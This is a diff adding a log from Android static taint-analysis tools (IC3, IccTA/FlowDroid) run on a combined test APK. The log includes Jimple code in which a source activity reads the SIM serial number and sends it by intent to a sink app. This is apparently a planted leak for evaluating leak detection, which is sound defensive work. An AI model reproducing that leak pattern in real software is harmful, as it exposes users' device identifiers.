@@ -1,0 +1,1147 @@
+Processing: /home/foellix/masterarbeit/test2/COMBINEDApp.apk (COMBINEDApp)
+CLEARING...
+Processing: /home/foellix/masterarbeit/test2/COMBINEDApp.apk (COMBINEDApp)
+IC3
+Soot started on Mon Apr 24 20:07:04 CEST 2017
+Using '/home/foellix/masterarbeit/platforms/android-18/android.jar' as android.jar
+[Call Graph] For information on where the call graph may be incomplete, use the verbose option to the cg phase.
+Transforming de.foellix.sourceapp.R$attr... 
+Transforming de.foellix.sinkapp.R$layout... 
+Transforming de.foellix.sourceapp.R$string... 
+Transforming de.foellix.sinkapp.R$dimen... 
+Transforming de.foellix.sinkapp.R$id... 
+Transforming de.foellix.sinkapp.R$mipmap... 
+Transforming de.foellix.sourceapp.R$color... 
+Transforming de.foellix.sinkapp.R... 
+Transforming de.foellix.sourceapp.R$layout... 
+Transforming de.foellix.sinkapp.R$style... 
+Transforming de.foellix.sourceapp.SourceMainActivity... 
+Transforming de.foellix.sourceapp.R$style... 
+Transforming de.foellix.sourceapp.R... 
+Transforming de.foellix.sourceapp.R$mipmap... 
+Transforming de.foellix.sinkapp.R$attr... 
+Transforming de.foellix.sourceapp.BuildConfig... 
+Transforming de.foellix.sourceapp.R$dimen... 
+Transforming de.foellix.sinkapp.SinkMainActivity... 
+Transforming de.foellix.sinkapp.R$string... 
+Transforming de.foellix.sinkapp.BuildConfig... 
+Transforming de.foellix.sourceapp.R$id... 
+Transforming de.foellix.sinkapp.R$color... 
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/R$attr.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/R$layout.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/R$string.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/R$dimen.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/R$id.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/R$mipmap.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/R$color.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/R.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/R$layout.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/R$style.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/SourceMainActivity.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/R$style.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/R.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/R$mipmap.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/R$attr.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/BuildConfig.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/R$dimen.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/SinkMainActivity.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/R$string.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/BuildConfig.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sourceapp/R$id.class
+Writing to testspace/COMBINEDApp.apk/retargeted/retargeted/COMBINEDApp/de/foellix/sinkapp/R$color.class
+Soot finished on Mon Apr 24 20:07:06 CEST 2017
+Soot has run for 0 min. 2 sec.
+Warning: java.lang.ref.Finalizer is a phantom class!
+[main] INFO  soot.jimple.infoflow.entryPointCreators.AndroidEntryPointCreator  - Generated main method:
+    public static void dummyMainMethod()
+    {
+        int $i0;
+        de.foellix.sinkapp.SinkMainActivity $r0;
+        android.os.Bundle $r1, $r3;
+        de.foellix.sourceapp.SourceMainActivity $r2;
+
+        $i0 = 0;
+
+     label0:
+        if $i0 == 0 goto label4;
+
+        $r0 = new de.foellix.sinkapp.SinkMainActivity;
+        specialinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void <init>()>();
+        if $i0 == 1 goto label4;
+
+     label1:
+        $r1 = new android.os.Bundle;
+        specialinvoke $r1.<android.os.Bundle: void <init>()>();
+        virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>($r1);
+        $r1 = null;
+
+     label2:
+        if $i0 == 3 goto label1;
+
+        if $i0 == 4 goto label3;
+
+        if $i0 == 5 goto label1;
+
+        if $i0 == 6 goto label2;
+
+     label3:
+        if $i0 == 7 goto label4;
+
+     label4:
+        if $i0 == 8 goto label8;
+
+        $r2 = new de.foellix.sourceapp.SourceMainActivity;
+        specialinvoke $r2.<de.foellix.sourceapp.SourceMainActivity: void <init>()>();
+        if $i0 == 9 goto label8;
+
+     label5:
+        $r3 = new android.os.Bundle;
+        specialinvoke $r3.<android.os.Bundle: void <init>()>();
+        virtualinvoke $r2.<de.foellix.sourceapp.SourceMainActivity: void onCreate(android.os.Bundle)>($r3);
+        $r3 = null;
+
+     label6:
+        if $i0 == 11 goto label5;
+
+        if $i0 == 12 goto label7;
+
+        if $i0 == 13 goto label5;
+
+        if $i0 == 14 goto label6;
+
+     label7:
+        if $i0 == 15 goto label8;
+
+     label8:
+        if $i0 == 16 goto label0;
+
+        return;
+    }
+
+[Call Graph] For information on where the call graph may be incomplete, use the verbose option to the cg phase.
+Callback analysis done.
+Warning: TextView is a phantom class!
+Warning: de.foellix.sourceapp.TextView is a phantom class!
+Warning: android.view.TextView is a phantom class!
+Found unrecognized XML attribute:  text
+Found 1 layout controls in file res/layout/activity_source_main.xml
+Transforming dummyMainClass... 
+Transforming de.foellix.sinkapp.SinkMainActivity... 
+Transforming de.foellix.sourceapp.SourceMainActivity... 
+Warning: java.lang.ref.Finalizer is a phantom class!
+[main] INFO  soot.jimple.infoflow.entryPointCreators.AndroidEntryPointCreator  - Generated main method:
+    public static void dummyMainMethod()
+    {
+        int $i0;
+        de.foellix.sinkapp.SinkMainActivity $r0;
+        android.os.Bundle $r1, $r3;
+        de.foellix.sourceapp.SourceMainActivity $r2;
+
+        $i0 = 0;
+
+     label0:
+        if $i0 == 0 goto label4;
+
+        $r0 = new de.foellix.sinkapp.SinkMainActivity;
+        specialinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void <init>()>();
+        if $i0 == 1 goto label4;
+
+     label1:
+        $r1 = new android.os.Bundle;
+        specialinvoke $r1.<android.os.Bundle: void <init>()>();
+        virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>($r1);
+        $r1 = null;
+
+     label2:
+        if $i0 == 4 goto label1;
+
+        if $i0 == 5 goto label3;
+
+        if $i0 == 6 goto label1;
+
+        if $i0 == 7 goto label2;
+
+     label3:
+        if $i0 == 8 goto label4;
+
+     label4:
+        if $i0 == 9 goto label8;
+
+        $r2 = new de.foellix.sourceapp.SourceMainActivity;
+        specialinvoke $r2.<de.foellix.sourceapp.SourceMainActivity: void <init>()>();
+        if $i0 == 10 goto label8;
+
+     label5:
+        $r3 = new android.os.Bundle;
+        specialinvoke $r3.<android.os.Bundle: void <init>()>();
+        virtualinvoke $r2.<de.foellix.sourceapp.SourceMainActivity: void onCreate(android.os.Bundle)>($r3);
+        $r3 = null;
+
+     label6:
+        if $i0 == 13 goto label5;
+
+        if $i0 == 14 goto label7;
+
+        if $i0 == 15 goto label5;
+
+        if $i0 == 16 goto label6;
+
+     label7:
+        if $i0 == 17 goto label8;
+
+     label8:
+        if $i0 == 18 goto label0;
+
+        return;
+    }
+
+[Call Graph] For information on where the call graph may be incomplete, use the verbose option to the cg phase.
+Running incremental callback analysis for 2 components...
+Incremental callback analysis done.
+Transforming dummyMainClass... 
+Transforming de.foellix.sinkapp.SinkMainActivity... 
+Transforming de.foellix.sourceapp.SourceMainActivity... 
+[main] INFO  edu.psu.cse.siis.ic3.SetupApplication  - Entry point calculation done.
+[main] INFO  soot.jimple.infoflow.entryPointCreators.AndroidEntryPointCreator  - Generated main method:
+    public static void dummyMainMethod()
+    {
+        int $i0;
+        de.foellix.sinkapp.SinkMainActivity $r0;
+        android.os.Bundle $r1, $r3;
+        de.foellix.sourceapp.SourceMainActivity $r2;
+
+        $i0 = 0;
+
+     label0:
+        if $i0 == 0 goto label4;
+
+        $r0 = new de.foellix.sinkapp.SinkMainActivity;
+        specialinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void <init>()>();
+        if $i0 == 1 goto label4;
+
+     label1:
+        $r1 = new android.os.Bundle;
+        specialinvoke $r1.<android.os.Bundle: void <init>()>();
+        virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>($r1);
+        $r1 = null;
+
+     label2:
+        if $i0 == 4 goto label1;
+
+        if $i0 == 5 goto label3;
+
+        if $i0 == 6 goto label1;
+
+        if $i0 == 7 goto label2;
+
+     label3:
+        if $i0 == 8 goto label4;
+
+     label4:
+        if $i0 == 9 goto label8;
+
+        $r2 = new de.foellix.sourceapp.SourceMainActivity;
+        specialinvoke $r2.<de.foellix.sourceapp.SourceMainActivity: void <init>()>();
+        if $i0 == 10 goto label8;
+
+     label5:
+        $r3 = new android.os.Bundle;
+        specialinvoke $r3.<android.os.Bundle: void <init>()>();
+        virtualinvoke $r2.<de.foellix.sourceapp.SourceMainActivity: void onCreate(android.os.Bundle)>($r3);
+        $r3 = null;
+
+     label6:
+        if $i0 == 13 goto label5;
+
+        if $i0 == 14 goto label7;
+
+        if $i0 == 15 goto label5;
+
+        if $i0 == 16 goto label6;
+
+     label7:
+        if $i0 == 17 goto label8;
+
+     label8:
+        if $i0 == 18 goto label0;
+
+        return;
+    }
+
+[Call Graph] For information on where the call graph may be incomplete, use the verbose option to the cg phase.
+[Spark] Pointer Assignment Graph in 0.0 seconds.
+[Spark] Type masks in 0.0 seconds.
+[Spark] Pointer Graph simplified in 0.0 seconds.
+[Spark] Propagation in 0.1 seconds.
+[Spark] Solution found in 0.1 seconds.
+[main] INFO  edu.psu.cse.siis.coal.PropagationSceneTransformer  - Solving propagation problem (iteration 0)
+[main] INFO  edu.psu.cse.siis.coal.PropagationSceneTransformer  - Reached a fixed point
+Transforming android.content.Intent... 
+Transforming android.content.IntentFilter... 
+Transforming android.os.Bundle... 
+Transforming android.content.ComponentName... 
+Transforming android.app.Activity... 
+Transforming dummyMainClass... 
+Transforming de.foellix.sinkapp.SinkMainActivity... 
+Transforming de.foellix.sourceapp.SourceMainActivity... 
+*****Result*****
+de.foellix.sinkapp.SinkMainActivity/void sink() : r2 = virtualinvoke $r1.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>("Secret")
+Components: [de.foellix.sinkapp.SinkMainActivity]
+    0 : [Secret]
+
+de.foellix.sourceapp.SourceMainActivity/void source() : virtualinvoke r0.<de.foellix.sourceapp.SourceMainActivity: void startActivity(android.content.Intent)>(r2)
+Components: [de.foellix.sourceapp.SourceMainActivity]
+    0 : Value: 1 path values
+  action=[de.foellix.CALLSINK, ],extras=[Secret, ],
+
+
+[main] INFO  edu.psu.cse.siis.ic3.ResultProcessor  - de.foellix.sourceapp 27 19 1363 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 2 0 0 0 0 0 0 0 0 1 194 2962 22 1299 16 296 1 4 983 155 6479
+
+Processing: /home/foellix/masterarbeit/test2/COMBINEDApp.apk (COMBINEDApp)
+IccTA
+[IccTA]/home/foellix/masterarbeit/test2/COMBINEDApp.apk, ../platforms
+[IccTA]ICC Provider is ic3
+link from intent id 1 to component id 2
+insert into Links (intent_id,component_id,type,reserved) values (?,?,?,?);
+link from intent id 1 to component id 2 is already exist.
+add ipc methods!
+add <android.content.Context: void startActivityForResult(android.content.Intent,int)>
+add <android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,android.os.CancellationSignal)>
+add <android.content.Context: void startActivityIfNeeded(android.content.Intent,int)>
+add <android.content.Context: void startActivity(android.content.Intent,android.os.Bundle)>
+add <android.content.Context: void startActivityFromFragment(android.app.Fragment,android.content.Intent,int)>
+add <android.content.Context: void startActivityFromChild(android.app.Activity,android.content.Intent,int,android.os.Bundle)>
+add <android.content.Context: void sendStickyBroadcastAsUser(android.content.Intent,android.os.UserHandle)>
+add <android.content.Context: void sendOrderedBroadcast(android.content.Intent,java.lang.String)>
+add <android.content.Context: void sendBroadcast(android.content.Intent,java.lang.String)>
+add <android.content.Context: android.content.ComponentName startService(android.content.Intent)>
+add <android.content.Context: void sendBroadcastAsUser(android.content.Intent,android.os.UserHandle,java.lang.String)>
+add <android.content.Context: void startActivity(android.content.Intent)>
+add <android.content.Context: void startActivities(android.content.Intent[],android.os.Bundle)>
+add <android.content.Context: void sendBroadcastAsUser(android.content.Intent,android.os.UserHandle)>
+add <android.content.ContentResolver: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
+add <android.content.Context: boolean bindService(android.content.Intent,android.content.ServiceConnection,int)>
+add <android.content.Context: void sendStickyOrderedBroadcastAsUser(android.content.Intent,android.os.UserHandle,android.content.BroadcastReceiver,android.os.Handler,int,java.lang.String,android.os.Bundle)>
+add <android.content.ContentResolver: android.net.Uri insert(android.net.Uri,android.content.ContentValues)>
+add <android.content.Context: void startActivityIfNeeded(android.content.Intent,int,android.os.Bundle)>
+add <android.content.Context: void startActivityFromChild(android.app.Activity,android.content.Intent,int)>
+add <android.content.Context: void startActivityForResult(android.content.Intent,int,android.os.Bundle)>
+add <android.content.Context: void sendStickyOrderedBroadcast(android.content.Intent,android.content.BroadcastReceiver,android.os.Handler,int,java.lang.String,android.os.Bundle)>
+add <android.content.Context: void startActivities(android.content.Intent[])>
+add <android.content.Context: void startActivityFromFragment(android.app.Fragment,android.content.Intent,int,android.os.Bundle)>
+add <android.content.Context: void sendOrderedBroadcast(android.content.Intent,java.lang.String,android.content.BroadcastReceiver,android.os.Handler,int,java.lang.String,android.os.Bundle)>
+add <android.content.Context: void sendOrderedBroadcastAsUser(android.content.Intent,android.os.UserHandle,java.lang.String,android.content.BroadcastReceiver,android.os.Handler,int,java.lang.String,android.os.Bundle)>
+add <android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
+add <android.content.Context: void sendBroadcast(android.content.Intent)>
+add <android.content.ContentResolver: int delete(android.net.Uri,java.lang.String,java.lang.String[])>
+add <android.content.Context: void sendStickyBroadcast(android.content.Intent)>
+[main] INFO soot.jimple.infoflow.taintWrappers.EasyTaintWrapper - Loaded wrapper entries for 65 classes and 5 exclusions.
+[main] INFO soot.jimple.infoflow.android.SetupApplication - ARSC file parsing took 0.01876698 seconds
+Warning: java.lang.invoke.LambdaMetafactory is a phantom class!
+Warning: java.lang.ref.Finalizer is a phantom class!
+[main] INFO soot.jimple.infoflow.entryPointCreators.AndroidEntryPointCreator - Generated main method:
+    public static void dummyMainMethod(java.lang.String[])
+    {
+        java.lang.String[] $r0;
+        int $i0;
+        de.foellix.sinkapp.SinkMainActivity $r1;
+        android.os.Bundle $r2, $r4;
+        de.foellix.sourceapp.SourceMainActivity $r3;
+
+        $r0 := @parameter0: java.lang.String[];
+
+        $i0 = 0;
+
+     label1:
+        if $i0 == 0 goto label3;
+
+        $r1 = new de.foellix.sinkapp.SinkMainActivity;
+
+        specialinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void <init>()>();
+
+        if $i0 == 1 goto label3;
+
+        $r2 = new android.os.Bundle;
+
+        specialinvoke $r2.<android.os.Bundle: void <init>()>();
+
+        virtualinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>($r2);
+
+        $r2 = null;
+
+     label2:
+        if $i0 == 3 goto label3;
+
+        if $i0 == 4 goto label2;
+
+     label3:
+        if $i0 == 6 goto label5;
+
+        $r3 = new de.foellix.sourceapp.SourceMainActivity;
+
+        specialinvoke $r3.<de.foellix.sourceapp.SourceMainActivity: void <init>()>();
+
+        if $i0 == 7 goto label5;
+
+        $r4 = new android.os.Bundle;
+
+        specialinvoke $r4.<android.os.Bundle: void <init>()>();
+
+        virtualinvoke $r3.<de.foellix.sourceapp.SourceMainActivity: void onCreate(android.os.Bundle)>($r4);
+
+        $r4 = null;
+
+     label4:
+        if $i0 == 9 goto label5;
+
+        if $i0 == 10 goto label4;
+
+     label5:
+        if $i0 == 12 goto label1;
+
+        return;
+    }
+
+[Call Graph] For information on where the call graph may be incomplete, use the verbose option to the cg phase.
+[Spark] Pointer Assignment Graph in 0.1 seconds.
+[Spark] Type masks in 0.0 seconds.
+[Spark] Pointer Graph simplified in 0.0 seconds.
+[Spark] Propagation in 0.2 seconds.
+[Spark] Solution found in 0.2 seconds.
+Callback analysis done.
+Warning: RelativeLayout is a phantom class!
+Warning: de.foellix.sourceapp.RelativeLayout is a phantom class!
+Warning: android.view.RelativeLayout is a phantom class!
+Warning: TextView is a phantom class!
+Warning: de.foellix.sourceapp.TextView is a phantom class!
+Warning: android.view.TextView is a phantom class!
+Found 1 layout controls in file res/layout/activity_source_main.xml
+Warning: java.lang.invoke.LambdaMetafactory is a phantom class!
+Warning: java.lang.ref.Finalizer is a phantom class!
+[main] INFO soot.jimple.infoflow.entryPointCreators.AndroidEntryPointCreator - Generated main method:
+    public static void dummyMainMethod(java.lang.String[])
+    {
+        java.lang.String[] $r0, $r3, $r7;
+        int $i0;
+        de.foellix.sinkapp.SinkMainActivity $r1;
+        android.os.Bundle $r2, $r6;
+        int[] $r4, $r8;
+        de.foellix.sourceapp.SourceMainActivity $r5;
+
+        $r0 := @parameter0: java.lang.String[];
+
+        $i0 = 0;
+
+     label01:
+        if $i0 == 0 goto label06;
+
+        $r1 = new de.foellix.sinkapp.SinkMainActivity;
+
+        specialinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void <init>()>();
+
+        if $i0 == 1 goto label06;
+
+        $r2 = new android.os.Bundle;
+
+        specialinvoke $r2.<android.os.Bundle: void <init>()>();
+
+        virtualinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>($r2);
+
+        $r2 = null;
+
+     label02:
+        if $i0 == 2 goto label05;
+
+     label03:
+        if $i0 == 3 goto label04;
+
+        $r3 = newarray (java.lang.String)[1];
+
+        $r3[0] = "";
+
+        $r4 = newarray (int)[1];
+
+        $r4[0] = 0;
+
+        virtualinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void onRequestPermissionsResult(int,java.lang.String[],int[])>(0, $r3, $r4);
+
+     label04:
+        if $i0 == 4 goto label03;
+
+     label05:
+        if $i0 == 5 goto label02;
+
+        if $i0 == 6 goto label06;
+
+        if $i0 == 7 goto label02;
+
+     label06:
+        if $i0 == 9 goto label11;
+
+        $r5 = new de.foellix.sourceapp.SourceMainActivity;
+
+        specialinvoke $r5.<de.foellix.sourceapp.SourceMainActivity: void <init>()>();
+
+        if $i0 == 10 goto label11;
+
+        $r6 = new android.os.Bundle;
+
+        specialinvoke $r6.<android.os.Bundle: void <init>()>();
+
+        virtualinvoke $r5.<de.foellix.sourceapp.SourceMainActivity: void onCreate(android.os.Bundle)>($r6);
+
+        $r6 = null;
+
+     label07:
+        if $i0 == 11 goto label10;
+
+     label08:
+        if $i0 == 12 goto label09;
+
+        $r7 = newarray (java.lang.String)[1];
+
+        $r7[0] = "";
+
+        $r8 = newarray (int)[1];
+
+        $r8[0] = 0;
+
+        virtualinvoke $r5.<de.foellix.sourceapp.SourceMainActivity: void onRequestPermissionsResult(int,java.lang.String[],int[])>(0, $r7, $r8);
+
+     label09:
+        if $i0 == 13 goto label08;
+
+     label10:
+        if $i0 == 14 goto label07;
+
+        if $i0 == 15 goto label11;
+
+        if $i0 == 16 goto label07;
+
+     label11:
+        if $i0 == 18 goto label01;
+
+        return;
+    }
+
+[Call Graph] For information on where the call graph may be incomplete, use the verbose option to the cg phase.
+[Spark] Pointer Assignment Graph in 0.0 seconds.
+[Spark] Type masks in 0.0 seconds.
+[Spark] Pointer Graph simplified in 0.0 seconds.
+[Spark] Propagation in 0.1 seconds.
+[Spark] Solution found in 0.1 seconds.
+Running incremental callback analysis for 2 components...
+Incremental callback analysis done.
+Found 4 callback methods for 2 components
+Found {res/layout/activity_source_main.xml=[2131230720 - android.widget.RelativeLayout, -1 - android.widget.TextView]} layout controls
+Entry point calculation done.
+Created a SourceSinkManager with 43 sources, 90 sinks, and 4 callback methods.
+Running data flow analysis...
+Running data flow analysis on /home/foellix/masterarbeit/test2/COMBINEDApp.apk with 43 sources and 90 sinks...
+Starting infoflow computation...
+[main] INFO soot.jimple.infoflow.Infoflow - Resetting Soot...
+Warning: java.lang.invoke.LambdaMetafactory is a phantom class!
+Warning: java.lang.ref.Finalizer is a phantom class!
+[main] INFO soot.jimple.infoflow.Infoflow - Basic class loading done.
+[main] INFO soot.jimple.infoflow.entryPointCreators.AndroidEntryPointCreator - Generated main method:
+    public static void dummyMainMethod(java.lang.String[])
+    {
+        java.lang.String[] $r0, $r3, $r7;
+        int $i0;
+        de.foellix.sinkapp.SinkMainActivity $r1;
+        android.os.Bundle $r2, $r6;
+        int[] $r4, $r8;
+        de.foellix.sourceapp.SourceMainActivity $r5;
+
+        $r0 := @parameter0: java.lang.String[];
+
+        $i0 = 0;
+
+     label01:
+        if $i0 == 0 goto label06;
+
+        $r1 = new de.foellix.sinkapp.SinkMainActivity;
+
+        specialinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void <init>()>();
+
+        if $i0 == 1 goto label06;
+
+        $r2 = new android.os.Bundle;
+
+        specialinvoke $r2.<android.os.Bundle: void <init>()>();
+
+        virtualinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>($r2);
+
+        $r2 = null;
+
+     label02:
+        if $i0 == 2 goto label05;
+
+     label03:
+        if $i0 == 3 goto label04;
+
+        $r3 = newarray (java.lang.String)[1];
+
+        $r3[0] = "";
+
+        $r4 = newarray (int)[1];
+
+        $r4[0] = 0;
+
+        virtualinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void onRequestPermissionsResult(int,java.lang.String[],int[])>(0, $r3, $r4);
+
+     label04:
+        if $i0 == 4 goto label03;
+
+     label05:
+        if $i0 == 5 goto label02;
+
+        if $i0 == 6 goto label06;
+
+        if $i0 == 7 goto label02;
+
+     label06:
+        if $i0 == 9 goto label11;
+
+        $r5 = new de.foellix.sourceapp.SourceMainActivity;
+
+        specialinvoke $r5.<de.foellix.sourceapp.SourceMainActivity: void <init>()>();
+
+        if $i0 == 10 goto label11;
+
+        $r6 = new android.os.Bundle;
+
+        specialinvoke $r6.<android.os.Bundle: void <init>()>();
+
+        virtualinvoke $r5.<de.foellix.sourceapp.SourceMainActivity: void onCreate(android.os.Bundle)>($r6);
+
+        $r6 = null;
+
+     label07:
+        if $i0 == 11 goto label10;
+
+     label08:
+        if $i0 == 12 goto label09;
+
+        $r7 = newarray (java.lang.String)[1];
+
+        $r7[0] = "";
+
+        $r8 = newarray (int)[1];
+
+        $r8[0] = 0;
+
+        virtualinvoke $r5.<de.foellix.sourceapp.SourceMainActivity: void onRequestPermissionsResult(int,java.lang.String[],int[])>(0, $r7, $r8);
+
+     label09:
+        if $i0 == 13 goto label08;
+
+     label10:
+        if $i0 == 14 goto label07;
+
+        if $i0 == 15 goto label11;
+
+        if $i0 == 16 goto label07;
+
+     label11:
+        if $i0 == 18 goto label01;
+
+        return;
+    }
+
+In step Beginning, The number of Jimple line is 28380
+In step Beginning, The number of Jimple method is 8460
+In step Beginning, The number of Jimple class is 606
+In step Beginning, The number of Jimple component is 6
+
+Application classes:
+de.foellix.sinkapp.SinkMainActivity
+android.transition.TransitionManager
+android.transition.Scene
+android.transition.Transition
+android.transition.TransitionValues
+android.transition.Transition$TransitionListener
+android.transition.Transition$EpicenterCallback
+android.transition.PathMotion
+android.transition.TransitionPropagation
+de.foellix.sinkapp.BuildConfig
+de.foellix.sinkapp.R$attr
+de.foellix.sinkapp.R
+de.foellix.sinkapp.R$color
+de.foellix.sinkapp.R$dimen
+de.foellix.sinkapp.R$id
+de.foellix.sinkapp.R$layout
+de.foellix.sinkapp.R$mipmap
+de.foellix.sinkapp.R$string
+de.foellix.sinkapp.R$style
+de.foellix.sourceapp.BuildConfig
+de.foellix.sourceapp.R$attr
+de.foellix.sourceapp.R
+de.foellix.sourceapp.R$color
+de.foellix.sourceapp.R$dimen
+de.foellix.sourceapp.R$id
+de.foellix.sourceapp.R$layout
+de.foellix.sourceapp.R$mipmap
+de.foellix.sourceapp.R$string
+de.foellix.sourceapp.R$style
+de.foellix.sourceapp.SourceMainActivity
+dummyMainClass
+SharedPreferencesHelper
+body:     private void source()
+    {
+        de.foellix.sourceapp.SourceMainActivity $r0;
+        android.content.Intent $r1;
+        java.lang.Object $r2;
+        android.telephony.TelephonyManager $r3;
+        java.lang.String $r4;
+
+        $r0 := @this: de.foellix.sourceapp.SourceMainActivity;
+
+        $r2 = virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: java.lang.Object getSystemService(java.lang.String)>("phone");
+
+        $r3 = (android.telephony.TelephonyManager) $r2;
+
+        $r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>();
+
+        $r1 = new android.content.Intent;
+
+        specialinvoke $r1.<android.content.Intent: void <init>(java.lang.String)>("de.foellix.CALLSINK");
+
+        virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("Secret", $r4);
+
+        virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: void startActivity(android.content.Intent)>($r1);
+
+        return;
+    }
+
+bs: $r0 := @this: de.foellix.sourceapp.SourceMainActivity
+bs: $r2 = virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: java.lang.Object getSystemService(java.lang.String)>("phone")
+s: $r2 = virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: java.lang.Object getSystemService(java.lang.String)>("phone")
+bs: $r3 = (android.telephony.TelephonyManager) $r2
+bs: $r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>()
+s: $r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>()
+bs: $r1 = new android.content.Intent
+bs: specialinvoke $r1.<android.content.Intent: void <init>(java.lang.String)>("de.foellix.CALLSINK")
+s: specialinvoke $r1.<android.content.Intent: void <init>(java.lang.String)>("de.foellix.CALLSINK")
+bs: virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("Secret", $r4)
+s: virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("Secret", $r4)
+bs: virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: void startActivity(android.content.Intent)>($r1)
+s: virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: void startActivity(android.content.Intent)>($r1)
+u: virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: void startActivity(android.content.Intent)>($r1)
+fromU: virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: void startActivity(android.content.Intent)>($r1)
+select distinct d.method, d.instruction, d.exit_kind, f.class from Applications a, Classes b, Components c, ExitPoints d, Applications e, Classes f, Components g, ProviderLinks h where a.id=b.app_id and b.id=c.class_id and b.id=d.class_id and e.id=f.app_id and f.id=g.class_id and c.id=h.src_component_id and g.id=h.dest_component_id and d.exit_kind='p' and a.app in (?) and e.app in (?);
+<de.foellix.sourceapp.SourceMainActivity: void source()> [7] de.foellix.sinkapp.SinkMainActivity {7}
+instrument destination class for de.foellix.sinkapp.SinkMainActivity
+[main] INFO soot.jimple.infoflow.entryPointCreators.AndroidEntryPointCreator - Generated main method:
+    public void dummyMainMethod()
+    {
+        de.foellix.sinkapp.SinkMainActivity this, $r0;
+        int $i0;
+        android.os.Bundle $r1;
+        java.lang.String[] $r2;
+        int[] $r3;
+        android.content.Intent $r4;
+
+        this := @this: de.foellix.sinkapp.SinkMainActivity;
+
+        $i0 = 0;
+
+     label1:
+        if $i0 == 0 goto label7;
+
+        $r0 = new de.foellix.sinkapp.SinkMainActivity;
+
+        specialinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void <init>()>();
+
+        if $i0 == 1 goto label7;
+
+        $r1 = new android.os.Bundle;
+
+        specialinvoke $r1.<android.os.Bundle: void <init>()>();
+
+        virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>($r1);
+
+        $r1 = null;
+
+     label2:
+        if $i0 == 2 goto label6;
+
+     label3:
+        if $i0 == 3 goto label4;
+
+        $r2 = newarray (java.lang.String)[1];
+
+        $r2[0] = "";
+
+        $r3 = newarray (int)[1];
+
+        $r3[0] = 0;
+
+        virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void onRequestPermissionsResult(int,java.lang.String[],int[])>(0, $r2, $r3);
+
+     label4:
+        if $i0 == 4 goto label5;
